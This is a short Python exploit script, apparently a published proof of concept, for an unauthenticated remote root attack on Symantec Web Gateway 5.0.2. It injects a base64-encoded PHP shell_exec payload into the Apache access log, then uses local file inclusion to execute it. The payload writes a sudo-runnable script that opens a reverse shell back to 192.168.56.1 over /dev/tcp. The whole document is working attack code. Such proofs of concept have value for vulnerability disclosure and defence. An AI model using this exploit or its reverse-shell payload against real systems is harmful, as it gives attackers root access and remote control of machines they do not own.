#!/usr/bin/python

# Symantec Web Gateway 5.0.2 Remote LFI root Exploit Proof of Concept
# Exploit requires no authentication, /tmp/networkScript is sudoable and apache writable.
# muts at offensive-security dot com


import socket
import base64

# שלבי הכנה
payload = '''echo '#!/bin/bash' > /tmp/networkScript; echo 'bash -i >& /dev/tcp/192.168.56.1/1234 0>&1' >> /tmp/networkScript; chmod 755 /tmp/networkScript; sudo /tmp/networkScript'''
payloadencoded = base64.encodebytes(payload.encode()).replace(b"\n", b"").decode()

# הזרקה לקובץ הלוג של Apache
taint = "GET /<?php shell_exec(base64_decode('%s'));?> HTTP/1.1\r\n\r\n" % payloadencoded
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.56.101", 80))
expl.send(taint.encode())
expl.close()

# שלב LFI להרצת הקוד מהלוג
trigger = "GET /lfi.php?relfile=../../../../../usr/local/apache2/logs/access_log.php HTTP/1.0\r\n\r\n"
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.56.101", 80))
expl.send(trigger.encode())
expl.close()

